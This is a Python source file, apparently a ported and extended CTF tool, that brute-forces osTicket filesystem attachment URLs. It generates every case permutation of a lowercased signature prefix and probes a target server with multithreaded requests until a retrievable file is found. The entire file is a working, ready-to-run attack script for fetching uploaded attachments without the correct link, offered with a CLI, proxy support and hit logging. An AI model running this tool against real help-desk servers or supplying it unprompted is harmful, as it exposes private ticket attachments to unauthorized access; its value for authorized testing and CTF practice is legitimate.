#!/usr/bin/env python3
"""
osticket_guess.py - OSTicket "Attachments on the Filesystem" path guesser.

Python port + enhancements of the bash original by @Und3r-r00t.
For use in CTFs and authorized security testing only.

Background
----------
When osTicket is configured with the "Attachments on the Filesystem" plugin,
uploaded files are written under a directory tree keyed by the file's
signature. The URL handed back to the user contains a (case-sensitive)
signature plus a separate file key. If the URL is logged or transmitted
through a system that normalizes case, the recipient may end up with a
lowercased signature that no longer matches the path on disk.

This tool reproduces the workflow of the original bash script: take the
first N characters of the URL key, generate every upper/lower case
permutation, and try them as both the subdirectory prefix and the
filename prefix until the right combination is found.

Docs:  https://docs.osticket.com/en/latest/Plugins/Attachments%20on%20the%20Filesystem.html
"""

from __future__ import annotations

import argparse
import itertools
import os
import signal
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Iterable
from urllib.parse import urlparse

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
except ImportError:
    sys.stderr.write(
        "[!] The 'requests' library is required.\n"
        "    Install it with:  pip install requests\n"
    )
    sys.exit(1)

# ---------------------------------------------------------------------------
# Colors (ANSI). Falls back to no color when stdout isn't a TTY or NO_COLOR
# is set in the environment.
# ---------------------------------------------------------------------------
_USE_COLOR = sys.stdout.isatty() and "NO_COLOR" not in os.environ
if os.name == "nt" and _USE_COLOR:
    # Enable VT processing on modern Windows terminals
    try:
        import ctypes
        kernel32 = ctypes.windll.kernel32
        kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
    except Exception:
        _USE_COLOR = False


def _c(code: str) -> str:
    return code if _USE_COLOR else ""


Y = _c("\033[1;33m")   # yellow
C = _c("\033[1;36m")   # cyan
G = _c("\033[1;32m")   # green
R = _c("\033[1;31m")   # red
D = _c("\033[1;90m")   # dim
END = _c("\033[0m")

BANNER = f"""
            ---------------------------------
            -                               -
            -   {C}Osticket guess file path{END}    -
            -                               -
            -    {C}Python port + enhanced{END}     -
            -    {C}Original: @Und3r-r00t{END}      -
            -                               -
            ---------------------------------
"""

NOTE = f"""{Y}[note!]{END}
{Y}[*] Attachments on the filesystem{END}
{Y}[*]{END} https://docs.osticket.com/en/latest/Plugins/Attachments%20on%20the%20Filesystem.html
"""


# ---------------------------------------------------------------------------
# Guess generation
# ---------------------------------------------------------------------------
def case_permutations(s: str) -> Iterable[str]:
    """Yield every upper/lower case permutation of *s*.

    For an alpha-only string this matches the bash brace expansion in the
    original script, e.g. ``{a,A}{b,B}{c,C}``.  Non-alpha characters are
    passed through unchanged.
    """
    variants = []
    for ch in s:
        if ch.isalpha():
            variants.append({ch.lower(), ch.upper()})
        else:
            variants.append({ch})
    for combo in itertools.product(*variants):
        yield "".join(combo)


def generate_urls(
    base: str,
    url_key: str,
    file_key: str,
    prefix_len: int,
    dir_depth: int,
) -> Iterable[str]:
    """Yield every candidate URL to try.

    Layout:  {base}/attachments/{subdir}/{permuted_key}{file_key}
    where ``subdir`` is the first *dir_depth* characters of the (also
    permuted) key.
    """
    prefix = url_key[:prefix_len]
    full_variants = list(case_permutations(prefix))
    # The remainder of the key is left untouched (matches the bash original,
    # which only permutes the first 5 chars).
    remainder = url_key[prefix_len:]

    seen_dirs: set[str] = set()
    base = base.rstrip("/")

    for v in full_variants:
        full_key = v + remainder
        # Build all candidate subdirectories from the first dir_depth chars
        # of this particular variant.  In the bash script dir_depth is 1.
        dir_seed = v[:dir_depth]
        for subdir in case_permutations(dir_seed):
            tag = f"{subdir}|{full_key}"
            if tag in seen_dirs:
                continue
            seen_dirs.add(tag)
            yield f"{base}/attachments/{subdir}/{full_key}{file_key}"


# ---------------------------------------------------------------------------
# HTTP worker
# ---------------------------------------------------------------------------
class Hunter:
    def __init__(self, args: argparse.Namespace) -> None:
        self.args = args
        self.session = self._build_session()
        self.hits: list[tuple[int, int, str]] = []
        self.lock = threading.Lock()
        self.stop = threading.Event()
        self.checked = 0

    # ------------------------------------------------------------------
    def _build_session(self) -> requests.Session:
        s = requests.Session()
        retry = Retry(
            total=self.args.retries,
            backoff_factor=0.3,
            status_forcelist=(500, 502, 503, 504),
            allowed_methods=frozenset(["GET", "HEAD"]),
        )
        adapter = HTTPAdapter(max_retries=retry, pool_connections=self.args.threads,
                              pool_maxsize=self.args.threads)
        s.mount("http://", adapter)
        s.mount("https://", adapter)
        s.headers.update({"User-Agent": self.args.user_agent})
        if self.args.proxy:
            s.proxies = {"http": self.args.proxy, "https": self.args.proxy}
        s.verify = not self.args.insecure
        return s

    # ------------------------------------------------------------------
    def _interesting(self, status: int, length: int) -> bool:
        if self.args.match_codes and status not in self.args.match_codes:
            return False
        if self.args.filter_codes and status in self.args.filter_codes:
            return False
        if self.args.min_size is not None and length < self.args.min_size:
            return False
        return True

    # ------------------------------------------------------------------
    def probe(self, url: str) -> None:
        if self.stop.is_set():
            return
        try:
            method = "HEAD" if self.args.head else "GET"
            r = self.session.request(
                method, url,
                timeout=self.args.timeout,
                allow_redirects=False,
                stream=True,
            )
            length = int(r.headers.get("Content-Length") or 0)
            if method == "GET" and not length:
                # Drain the body to learn its size without holding it all
                length = sum(len(chunk) for chunk in r.iter_content(8192))
            r.close()
        except requests.RequestException as exc:
            if self.args.verbose:
                with self.lock:
                    print(f"{D}[err] {url}  ({exc.__class__.__name__}){END}")
            return
        finally:
            with self.lock:
                self.checked += 1

        if self._interesting(r.status_code, length):
            with self.lock:
                self.hits.append((r.status_code, length, url))
                print(
                    f"{G}[+]{END} {r.status_code} "
                    f"{D}len={length:>7}{END}  {url}"
                )
        elif self.args.verbose:
            with self.lock:
                print(f"{D}[-] {r.status_code} {url}{END}")


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------
def _csv_ints(raw: str) -> set[int]:
    out: set[int] = set()
    for piece in raw.split(","):
        piece = piece.strip()
        if not piece:
            continue
        out.add(int(piece))
    return out


def _normalize_target(raw: str) -> str:
    raw = raw.strip().rstrip("/")
    if not raw:
        raise ValueError("empty target")
    parsed = urlparse(raw if "://" in raw else f"http://{raw}")
    if not parsed.netloc:
        raise ValueError(f"could not parse target: {raw!r}")
    return f"{parsed.scheme}://{parsed.netloc}{parsed.path}"


def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(
        prog="osticket_guess",
        description="Brute-force osTicket filesystem attachment paths by "
                    "case-permuting the signature.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    p.add_argument("-t", "--target", help="Target host or full base URL "
                                          "(e.g. example.com or https://example.com)")
    p.add_argument("-u", "--url-key", help="The URL key (signature) you observed")
    p.add_argument("-f", "--file-key", help="The file key appended after the signature")
    p.add_argument("-n", "--prefix-len", type=int, default=5,
                   help="How many leading characters of the URL key to permute "
                        "(default: 5, matches the bash original)")
    p.add_argument("-d", "--dir-depth", type=int, default=1,
                   help="Number of characters to use as the subdirectory prefix "
                        "(default: 1)")
    p.add_argument("-T", "--threads", type=int, default=20,
                   help="Concurrent requests (default: 20)")
    p.add_argument("--timeout", type=float, default=8.0,
                   help="Per-request timeout in seconds (default: 8)")
    p.add_argument("--retries", type=int, default=2,
                   help="Retries for transient 5xx errors (default: 2)")
    p.add_argument("--proxy", help="HTTP/HTTPS proxy URL, e.g. http://127.0.0.1:8080")
    p.add_argument("--user-agent", default="osticket-guess/1.0 (+research)",
                   help="Custom User-Agent header")
    p.add_argument("-k", "--insecure", action="store_true",
                   help="Skip TLS certificate verification")
    p.add_argument("--head", action="store_true",
                   help="Use HEAD requests instead of GET (faster, no body)")
    p.add_argument("-mc", "--match-codes", type=_csv_ints, default={200},
                   help="Comma-separated status codes to treat as hits "
                        "(default: 200). Set to 0 to disable filtering.")
    p.add_argument("-fc", "--filter-codes", type=_csv_ints, default=set(),
                   help="Comma-separated status codes to suppress")
    p.add_argument("--min-size", type=int,
                   help="Minimum response size (bytes) to report as a hit")
    p.add_argument("-o", "--output",
                   help="Write hits to this file (one per line, status\\tlen\\turl)")
    p.add_argument("--dry-run", action="store_true",
                   help="Print the URLs that would be tested, don't send requests")
    p.add_argument("-v", "--verbose", action="store_true",
                   help="Print every probe, not just hits")
    args = p.parse_args()

    # Disable match-codes if user passed "0"
    if args.match_codes == {0}:
        args.match_codes = set()
    return args


def prompt_missing(args: argparse.Namespace) -> argparse.Namespace:
    """Interactive fallback so the script behaves like the bash original
    when run with no arguments.  An explicitly-passed empty string (e.g.
    ``-f ""``) is honoured and will NOT trigger a prompt."""
    if args.target is None:
        args.target = input("Target: ").strip()
    if args.url_key is None:
        args.url_key = input("Url key: ").strip()
    if args.file_key is None:
        args.file_key = input("File key (leave blank if none): ")
    return args


def main() -> int:
    print(BANNER)
    print(NOTE)
    time.sleep(1)

    args = parse_args()
    args = prompt_missing(args)

    try:
        base = _normalize_target(args.target)
    except ValueError as exc:
        print(f"{R}[!] {exc}{END}", file=sys.stderr)
        return 2

    if not args.url_key:
        print(f"{R}[!] url-key is required{END}", file=sys.stderr)
        return 2
    if args.file_key is None:
        args.file_key = ""

    if args.prefix_len < 1 or args.prefix_len > len(args.url_key):
        print(f"{R}[!] --prefix-len must be between 1 and len(url-key)={len(args.url_key)}{END}",
              file=sys.stderr)
        return 2
    if args.dir_depth < 1 or args.dir_depth > args.prefix_len:
        print(f"{R}[!] --dir-depth must be between 1 and --prefix-len{END}",
              file=sys.stderr)
        return 2

    urls = list(generate_urls(base, args.url_key, args.file_key,
                              args.prefix_len, args.dir_depth))
    total = len(urls)
    print(f"{C}[i]{END} target     : {base}")
    print(f"{C}[i]{END} url key    : {args.url_key}")
    print(f"{C}[i]{END} file key   : {args.file_key}")
    print(f"{C}[i]{END} prefix len : {args.prefix_len}   dir depth: {args.dir_depth}")
    print(f"{C}[i]{END} candidates : {total}")
    print(f"{C}[i]{END} threads    : {args.threads}\n")

    if args.dry_run:
        for u in urls:
            print(u)
        return 0

    hunter = Hunter(args)

    def _sigint(*_: object) -> None:
        if not hunter.stop.is_set():
            print(f"\n{Y}[!] interrupt — stopping after in-flight requests…{END}",
                  file=sys.stderr)
        hunter.stop.set()

    signal.signal(signal.SIGINT, _sigint)

    started = time.monotonic()
    with ThreadPoolExecutor(max_workers=args.threads) as pool:
        futures = [pool.submit(hunter.probe, u) for u in urls]
        for _ in as_completed(futures):
            if hunter.stop.is_set():
                break
    elapsed = time.monotonic() - started

    print()
    if hunter.hits:
        print(f"{G}[✓] {len(hunter.hits)} hit(s) in {elapsed:.1f}s "
              f"({hunter.checked}/{total} probed){END}")
        for status, length, url in hunter.hits:
            print(f"    {status}  len={length:<7}  {url}")
    else:
        print(f"{Y}[-] no hits in {elapsed:.1f}s ({hunter.checked}/{total} probed){END}")

    if args.output and hunter.hits:
        try:
            with open(args.output, "w", encoding="utf-8") as fh:
                for status, length, url in hunter.hits:
                    fh.write(f"{status}\t{length}\t{url}\n")
            print(f"{C}[i]{END} hits written to {args.output}")
        except OSError as exc:
            print(f"{R}[!] could not write {args.output}: {exc}{END}", file=sys.stderr)

    return 0 if hunter.hits else 1


if __name__ == "__main__":
    sys.exit(main())
